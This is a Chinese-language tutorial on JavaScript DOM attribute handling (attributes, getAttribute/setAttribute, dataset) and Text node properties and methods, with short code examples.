<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;body bgcolor=&quot;yellow&quot; onload=&quot;&quot;&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">attributes</span>[<span class="number">0</span>]</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">attributes</span>.<span class="property">bgcolor</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">attributes</span>[<span class="string">&#x27;ONLOAD&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>注意，上面代码的三种方法，<strong>返回的都是属性节点对象，而不是属性值</strong>。</p>
<p><strong>属性节点对象有<code>name</code>和<code>value</code>属性</strong>，对应该属性的属性名和属性值，等同于<code>nodeName</code>属性和<code>nodeValue</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;mydiv&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> n = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">n.<span class="property">attributes</span>[<span class="number">0</span>].<span class="property">name</span> <span class="comment">// &quot;id&quot;</span></span><br><span class="line">n.<span class="property">attributes</span>[<span class="number">0</span>].<span class="property">nodeName</span> <span class="comment">// &quot;id&quot;</span></span><br><span class="line"></span><br><span class="line">n.<span class="property">attributes</span>[<span class="number">0</span>].<span class="property">value</span> <span class="comment">// &quot;mydiv&quot;</span></span><br><span class="line">n.<span class="property">attributes</span>[<span class="number">0</span>].<span class="property">nodeValue</span> <span class="comment">// &quot;mydiv&quot;</span></span><br></pre></td></tr></table></figure>

<p>下面代码可以遍历一个元素节点的所有属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> para = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;p&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> result = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (para.<span class="title function_">hasAttributes</span>()) &#123;</span><br><span class="line">  <span class="keyword">var</span> attrs = para.<span class="property">attributes</span>;</span><br><span class="line">  <span class="keyword">var</span> output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = attrs.<span class="property">length</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    output += attrs[i].<span class="property">name</span> + <span class="string">&#x27;-&gt;&#x27;</span> + attrs[i].<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result.<span class="property">textContent</span> = output;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  result.<span class="property">textContent</span> = <span class="string">&#x27;No attributes to show&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2、元素的标准属性"><a href="#2、元素的标准属性" class="headerlink" title="2、元素的标准属性"></a>2、元素的标准属性</h3><p>HTML 元素的标准属性（即<strong>在标准中定义的属性</strong>），会<strong>自动成为元素节点对象的属性</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;a id=&quot;aId&quot; href=&quot;http://www.example.com&quot; class=&quot;aClass&quot;&gt;链接&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a是节点对象，id和href自动成为a节点的属性</span></span><br><span class="line">a.<span class="property">id</span> <span class="comment">// &quot;aId&quot; </span></span><br><span class="line">a.<span class="property">href</span> <span class="comment">// &quot;http://www.example.com/&quot;</span></span><br><span class="line">a.<span class="property">className</span> <span class="comment">// &quot;aClass&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>a</code>元素标签的属性<code>id</code>和<code>href</code>，自动成为节点对象的属性。</p>
<p>这些属性都是可写的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myImage&#x27;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&#x27;http://www.example.com/image.jpg&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>上面的写法，会立刻替换掉<code>img</code>对象的<code>src</code>属性，即会显示另外一张图片。</p>
<p>这种修改属性的方法，常常用于添加表单的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>];</span><br><span class="line">f.<span class="property">action</span> = <span class="string">&#x27;submit.php&#x27;</span>;</span><br><span class="line">f.<span class="property">method</span> = <span class="string">&#x27;POST&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码为表单添加提交网址和提交方法。</p>
<p>注意，<strong>这种用法虽然可以读写属性，但是无法删除属性</strong>，<code>delete</code>运算符在这里不会生效。</p>
<p>HTML 元素的属性名是大小写不敏感的，但是 JavaScript 对象的属性名是大小写敏感的。转换规则是，转为 JavaScript 属性名时，一律采用小写。<strong>如果属性名包括多个单词，则采用骆驼拼写法</strong>，即从第二个单词开始，每个单词的首字母采用大写，比如<code>onClick</code>。</p>
<p>有些 HTML 属性名是 JavaScript 的保留字，转为 JavaScript 属性时，必须改名。主要是以下两个。</p>
<ul>
<li><code>for</code>属性改为<code>htmlFor</code></li>
<li><code>class</code>属性改为<code>className</code></li>
</ul>
<p>另外，HTML 属性值一般都是字符串，但是 JavaScript 属性会自动转换类型。比如，将字符串<code>true</code>转为布尔值，将<code>onClick</code>的值转为一个函数，将<code>style</code>属性的值转为一个<code>CSSStyleDeclaration</code>对象。因此，可以对这些属性赋予各种类型的值。</p>
<h3 id="3、属性操作的标准方法"><a href="#3、属性操作的标准方法" class="headerlink" title="3、属性操作的标准方法"></a>3、属性操作的标准方法</h3><h4 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h4><p><strong>元素节点提供六个方法，用来操作属性。</strong></p>
<ul>
<li><code>getAttribute()</code></li>
<li><code>getAttributeNames()</code></li>
<li><code>setAttribute()</code></li>
<li><code>hasAttribute()</code></li>
<li><code>hasAttributes()</code></li>
<li><code>removeAttribute()</code></li>
</ul>
<p>这有几点注意。</p>
<p>（1）适用性</p>
<p>这六个方法<strong>对所有属性（包括用户自定义的属性）都适用</strong>。</p>
<p>（2）返回值</p>
<p><code>getAttribute()</code>只返回字符串，不会返回其他类型的值。</p>
<p>（3）属性名</p>
<p>这些方法只接受属性的标准名称，不用改写保留字，比如<code>for</code>和<code>class</code>都可以直接使用。另外，这些方法对于属性名是大小写不敏感的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> image = <span class="variable language_">document</span>.<span class="property">images</span>[<span class="number">0</span>];</span><br><span class="line">image.<span class="title function_">setAttribute</span>(<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;myImage&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>setAttribute</code>方法直接使用<code>class</code>作为属性名，不用写成<code>className</code>。</p>
<h4 id="3-2-Element-getAttribute-返回元素的指定属性值，字符串"><a href="#3-2-Element-getAttribute-返回元素的指定属性值，字符串" class="headerlink" title="3.2 Element.getAttribute() 返回元素的指定属性值，字符串"></a>3.2 Element.getAttribute() 返回元素的指定属性值，字符串</h4><p><code>Element.getAttribute</code>方法<strong>返回当前元素节点的指定属性</strong>。如果指定属性不存在，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div1&quot; align=&quot;left&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line">div.<span class="title function_">getAttribute</span>(<span class="string">&#x27;align&#x27;</span>) <span class="comment">// &quot;left&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="3-3-Element-getAttributeNames-返回一个数组，成员是元素的所有属性的名字"><a href="#3-3-Element-getAttributeNames-返回一个数组，成员是元素的所有属性的名字" class="headerlink" title="3.3 Element.getAttributeNames() 返回一个数组，成员是元素的所有属性的名字"></a>3.3 Element.getAttributeNames() 返回一个数组，成员是元素的所有属性的名字</h4><p><code>Element.getAttributeNames()</code><strong>返回一个数组，成员是当前元素的所有属性的名字</strong>。如果当前元素没有任何属性，则返回一个空数组。使用<code>Element.attributes</code>属性，也可以拿到同样的结果，唯一的区别是它返回的是类似数组的对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mydiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mydiv.<span class="title function_">getAttributeNames</span>().<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">key</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> value = mydiv.<span class="title function_">getAttribute</span>(key);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key, value);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>上面代码用于遍历某个节点的所有属性。</p>
<h4 id="3-4-Element-setAttribute-为元素设置（新增）属性"><a href="#3-4-Element-setAttribute-为元素设置（新增）属性" class="headerlink" title="3.4 Element.setAttribute() 为元素设置（新增）属性"></a>3.4 Element.setAttribute() 为元素设置（新增）属性</h4><p><code>Element.setAttribute</code>方法用于<strong>为当前元素节点新增属性</strong>。如果同名属性已存在，则相当于编辑已存在的属性。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;button&gt;Hello World&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">b.<span class="title function_">setAttribute</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;myButton&#x27;</span>);</span><br><span class="line">b.<span class="title function_">setAttribute</span>(<span class="string">&#x27;disabled&#x27;</span>, <span class="literal">true</span>); <span class="comment">// 属性值总是字符串，其他类型会转成字符串，这里会转成字符串&#x27;true&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>button</code>元素的<code>name</code>属性被设成<code>myButton</code>，<code>disabled</code>属性被设成<code>true</code>。</p>
<p>这里有两个地方需要注意，首先，属性值总是字符串，其他类型的值会自动转成字符串，比如布尔值<code>true</code>就会变成字符串<code>true</code>；其次，上例的<code>disable</code>属性是一个布尔属性，对于<code>&lt;button&gt;</code>元素来说，这个属性不需要属性值，只要设置了就总是会生效，因此<code>setAttribute</code>方法里面可以将<code>disabled</code>属性设成任意值。</p>
<h4 id="3-5-Element-hasAttribute-是否包含指定属性"><a href="#3-5-Element-hasAttribute-是否包含指定属性" class="headerlink" title="3.5 Element.hasAttribute() 是否包含指定属性"></a>3.5 Element.hasAttribute() 是否包含指定属性</h4><p><code>Element.hasAttribute</code>方法<strong>返回一个布尔值，表示当前元素节点是否包含指定属性</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (d.<span class="title function_">hasAttribute</span>(<span class="string">&#x27;align&#x27;</span>)) &#123;</span><br><span class="line">  d.<span class="title function_">setAttribute</span>(<span class="string">&#x27;align&#x27;</span>, <span class="string">&#x27;center&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码检查<code>div</code>节点是否含有<code>align</code>属性。如果有，则设置为居中对齐。</p>
<h4 id="3-6-Element-hasAttributes-是否有任何的属性"><a href="#3-6-Element-hasAttributes-是否有任何的属性" class="headerlink" title="3.6 Element.hasAttributes() 是否有任何的属性"></a>3.6 Element.hasAttributes() 是否有任何的属性</h4><p><code>Element.hasAttributes</code>方法<strong>返回一个布尔值，表示当前元素是否有属性，如果没有任何属性，就返回<code>false</code>，否则返回<code>true</code>。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">foo.<span class="title function_">hasAttributes</span>() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="3-7-Element-removeAttribute-移除指定属性"><a href="#3-7-Element-removeAttribute-移除指定属性" class="headerlink" title="3.7 Element.removeAttribute() 移除指定属性"></a>3.7 Element.removeAttribute() 移除指定属性</h4><p><code>Element.removeAttribute</code>方法<strong>移除指定属性</strong>。该方法<strong>没有返回值</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div1&quot; align=&quot;left&quot; width=&quot;200px&quot;&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>).<span class="title function_">removeAttribute</span>(<span class="string">&#x27;align&#x27;</span>);</span><br><span class="line"><span class="comment">// 现在的HTML代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div1&quot; width=&quot;200px&quot;&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="4、dataset-属性-获取data-自定义属性"><a href="#4、dataset-属性-获取data-自定义属性" class="headerlink" title="4、dataset 属性   获取data-*自定义属性"></a>4、dataset 属性   获取data-*自定义属性</h3><p>有时，需要在HTML元素上附加数据，供 JavaScript 脚本使用。一种解决方法是<strong>自定义属性</strong>。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mydiv&quot;</span> <span class="attr">foo</span>=<span class="string">&quot;bar&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码为<code>div</code>元素<strong>自定义了<code>foo</code>属性</strong>，然后可以用<code>getAttribute()</code>和<code>setAttribute()</code>读写这个属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line">n.<span class="title function_">getAttribute</span>(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// bar</span></span><br><span class="line">n.<span class="title function_">setAttribute</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;baz&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>这种方法虽然可以达到目的，但是会使得 HTML 元素的属性不符合标准，导致网页代码通不过校验。</strong></p>
<p>更好的解决方法是，使用<strong>标准提供的<code>data-*</code>属性</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;mydiv&quot;</span> data-foo=<span class="string">&quot;bar&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>然后，使用元素节点对象的<code>dataset</code>属性，它指向一个对象，可以用来操作 HTML 元素标签的<code>data-*</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line">n.<span class="property">dataset</span>.<span class="property">foo</span> <span class="comment">// bar  省略data-，直接访问foo即可访问到 data-foo的值</span></span><br><span class="line">n.<span class="property">dataset</span>.<span class="property">foo</span> = <span class="string">&#x27;baz&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，通过<code>dataset.foo</code>读写<code>data-foo</code>属性。</p>
<p><strong>删除一个<code>data-*</code>属性，可以直接使用<code>delete</code>命令。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>).<span class="property">dataset</span>.<span class="property">foo</span>;</span><br></pre></td></tr></table></figure>

<p>除了<code>dataset</code>属性，也可以用<code>getAttribute(&#39;data-foo&#39;)</code>、<code>removeAttribute(&#39;data-foo&#39;)</code>、<code>setAttribute(&#39;data-foo&#39;)</code>、<code>hasAttribute(&#39;data-foo&#39;)</code>等方法操作<code>data-*</code>属性。</p>
<p>注意，<code>data-</code>后面的属性名有限制，只能包含字母、数字、连词线（<code>-</code>）、点（<code>.</code>）、冒号（<code>:</code>）和下划线（<code>_</code>)。而且，属性名<strong>不应该使用<code>A</code>到<code>Z</code>的大写字母</strong>，比如不能有<code>data-helloWorld</code>这样的属性名，而要写成<code>data-hello-world</code>。</p>
<p><strong>data-后面不能使用驼峰写法，可以使用烤串写法。</strong></p>
<p>转成<code>dataset</code>的键名时，连词线后面如果跟着一个小写字母，那么连词线会被移除，该小写字母转为大写字母，其他字符不变。反过来，<code>dataset</code>的键名转成属性名时，所有大写字母都会被转成连词线+该字母的小写形式，其他字符不变。比如，<code>dataset.helloWorld</code>会转成<code>data-hello-world</code>。</p>
<p><strong>通过dataset访问的时候，如有烤串写法属性需通过驼峰写法访问</strong></p>
<h2 id="八、Text-节点和-DocumentFragment-节点"><a href="#八、Text-节点和-DocumentFragment-节点" class="headerlink" title="八、Text 节点和 DocumentFragment 节点"></a>八、Text 节点和 DocumentFragment 节点</h2><h3 id="1、Text-节点的概念"><a href="#1、Text-节点的概念" class="headerlink" title="1、Text 节点的概念"></a>1、Text 节点的概念</h3><p><strong>文本节点（<code>Text</code>）代表元素节点（<code>Element</code>）和属性节点（<code>Attribute</code>）的文本内容。如果一个节点只包含一段文本，那么它就有一个文本子节点，代表该节点的文本内容。</strong></p>
<p>通常我们使用父节点的<code>firstChild</code>、<code>nextSibling</code>等属性获取文本节点，或者使用<code>Document</code>节点的<code>createTextNode</code>方法创造一个文本节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取文本节点</span></span><br><span class="line"><span class="keyword">var</span> textNode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>).<span class="property">firstChild</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创造文本节点</span></span><br><span class="line"><span class="keyword">var</span> textNode = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">appendChild</span>(textNode);</span><br></pre></td></tr></table></figure>

<p>浏览器原生提供一个**<code>Text</code>构造函数**。它返回一个文本节点实例。它的参数就是该文本节点的文本内容。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 空字符串</span></span><br><span class="line"><span class="keyword">var</span> text1 = <span class="keyword">new</span> <span class="title class_">Text</span>(); <span class="comment">// 返回一个文本实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 非空字符串</span></span><br><span class="line"><span class="keyword">var</span> text2 = <span class="keyword">new</span> <span class="title class_">Text</span>(<span class="string">&#x27;This is a text node&#x27;</span>); <span class="comment">// 参数为该文本节点的文本内容</span></span><br></pre></td></tr></table></figure>

<p>注意，由于空格也是一个字符，所以哪怕只有一个空格，也会形成文本节点。比如，<code> </code>包含一个空格，它的子节点就是一个文本节点。</p>
<p>文本节点除了<strong>继承<code>Node</code>接口，还继承了<code>CharacterData</code>接口</strong>。<code>Node</code>接口的属性和方法请参考《Node 接口》一章，这里不再重复介绍了，以下的属性和方法大部分来自<code>CharacterData</code>接口。</p>
<h3 id="2、Text-节点的属性"><a href="#2、Text-节点的属性" class="headerlink" title="2、Text 节点的属性"></a>2、Text 节点的属性</h3><h4 id="2-1-data-设置或读取文本节点内容"><a href="#2-1-data-设置或读取文本节点内容" class="headerlink" title="2.1 data  设置或读取文本节点内容"></a>2.1 data  设置或读取文本节点内容</h4><p><code>data</code>属性等同于<code>nodeValue</code>属性，用来<strong>设置或读取文本节点的内容</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取文本内容</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>).<span class="property">firstChild</span>.<span class="property">data</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>).<span class="property">firstChild</span>.<span class="property">nodeValue</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文本内容</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>).<span class="property">firstChild</span>.<span class="property">data</span> = <span class="string">&#x27;Hello World&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h4 id="2-2-wholeText-当前文本和毗邻文本节，作为整体返回"><a href="#2-2-wholeText-当前文本和毗邻文本节，作为整体返回" class="headerlink" title="2.2 wholeText 当前文本和毗邻文本节，作为整体返回"></a>2.2 wholeText 当前文本和毗邻文本节，作为整体返回</h4><p><code>wholeText</code>属性<strong>将当前文本节点与毗邻的文本节点，作为一个整体返回</strong>。大多数情况下，<code>wholeText</code>属性的返回值，与<code>data</code>属性和<code>textContent</code>属性相同。但是，某些特殊情况会有差异。</p>
<p>举例来说，HTML 代码如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=<span class="string">&quot;para&quot;</span>&gt;A &lt;em&gt;B&lt;<span class="regexp">/em&gt; C&lt;/</span>p&gt;</span><br></pre></td></tr></table></figure>

<p>这时，文本节点的<code>wholeText</code>属性和<code>data</code>属性，返回值相同。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;para&#x27;</span>);</span><br><span class="line">el.<span class="property">firstChild</span>.<span class="property">wholeText</span> <span class="comment">// &quot;A &quot;</span></span><br><span class="line">el.<span class="property">firstChild</span>.<span class="property">data</span> <span class="comment">// &quot;A &quot;</span></span><br></pre></td></tr></table></figure>

<p>但是，一旦移除<code>&lt;em&gt;</code>节点，<code>wholeText</code>属性与<code>data</code>属性就会有差异，因为这时其实<code> &lt;p&gt; </code>节点下面包含了两个毗邻的文本节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="title function_">removeChild</span>(para.<span class="property">childNodes</span>[<span class="number">1</span>]);</span><br><span class="line">el.<span class="property">firstChild</span>.<span class="property">wholeText</span> <span class="comment">// &quot;A C&quot;</span></span><br><span class="line">el.<span class="property">firstChild</span>.<span class="property">data</span> <span class="comment">// &quot;A &quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-3-length-文本长度"><a href="#2-3-length-文本长度" class="headerlink" title="2.3 length 文本长度"></a>2.3 length 文本长度</h4><p><code>length</code>属性<strong>返回当前文本节点的文本长度</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">Text</span>(<span class="string">&#x27;Hello&#x27;</span>)).<span class="property">length</span> <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>



<h4 id="2-4-nextElementSibling-后一个兄弟元素节点，previousElementSibling-前一个兄弟元素节点"><a href="#2-4-nextElementSibling-后一个兄弟元素节点，previousElementSibling-前一个兄弟元素节点" class="headerlink" title="2.4 nextElementSibling 后一个兄弟元素节点，previousElementSibling 前一个兄弟元素节点"></a>2.4 nextElementSibling 后一个兄弟元素节点，previousElementSibling 前一个兄弟元素节点</h4><p><code>nextElementSibling</code>属性<strong>返回紧跟在当前文本节点后面的那个同级元素节点</strong>。如果取不到元素节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 为</span></span><br><span class="line"><span class="comment">// &lt;div&gt;Hello &lt;em&gt;World&lt;/em&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> tn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="property">firstChild</span>;</span><br><span class="line">tn.<span class="property">nextElementSibling</span></span><br><span class="line"><span class="comment">// &lt;em&gt;World&lt;/em&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>previousElementSibling</code>属性<strong>返回当前文本节点前面最近的同级元素节点</strong>。如果取不到元素节点，则返回<code>null：</code>。</p>
<h3 id="3、Text-节点的方法"><a href="#3、Text-节点的方法" class="headerlink" title="3、Text 节点的方法"></a>3、Text 节点的方法</h3><h4 id="3-1-appendData-，deleteData-，insertData-，replaceData-，substringData"><a href="#3-1-appendData-，deleteData-，insertData-，replaceData-，substringData" class="headerlink" title="3.1 appendData()，deleteData()，insertData()，replaceData()，substringData()"></a>3.1 appendData()，deleteData()，insertData()，replaceData()，substringData()</h4><p>以下5个方法都是<strong>编辑<code>Text</code>节点文本内容的方法</strong>。</p>
<ul>
<li><code>appendData()</code>：在<code>Text</code>节点<strong>尾部追加字符串</strong>。</li>
<li><code>deleteData()</code>：<strong>删除<code>Text</code>节点内部的子字符串</strong>，第一个参数为子字符串开始位置，第二个参数为子字符串长度。</li>
<li><code>insertData()</code>：在<code>Text</code>节点<strong>插入字符串</strong>，第一个参数为插入位置，第二个参数为插入的子字符串。</li>
<li><code>replaceData()</code>：用于<strong>替换文本</strong>，第一个参数为替换开始位置，第二个参数为需要被替换掉的长度，第三个参数为新加入的字符串。</li>
<li><code>substringData()</code>：用于<strong>获取子字符串</strong>，第一个参数为子字符串在<code>Text</code>节点中的开始位置，第二个参数为子字符串长度。</li>
</ul>
